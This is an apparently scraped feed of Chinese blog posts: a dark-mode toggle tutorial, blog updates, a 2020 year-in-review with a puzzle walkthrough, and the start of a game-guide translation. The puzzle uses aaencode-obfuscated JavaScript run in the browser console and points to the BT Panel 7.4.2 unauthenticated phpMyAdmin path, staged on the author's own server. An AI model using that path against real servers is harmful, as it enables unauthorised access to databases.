为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a 